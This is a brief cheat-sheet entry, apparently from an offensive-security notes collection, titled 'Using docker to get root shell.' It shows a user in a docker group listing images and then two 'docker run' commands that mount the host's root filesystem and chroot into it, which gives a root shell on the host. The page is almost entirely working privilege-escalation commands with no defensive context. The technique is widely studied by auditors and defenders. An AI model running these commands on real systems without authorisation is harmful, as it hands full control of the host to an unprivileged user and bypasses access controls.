---
description: Using docker to get root shell.
---

# Docker

```
test@host:~$ groups
test dockers
$ docker images

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it IMAGE_NAME chroot /mnt sh
```
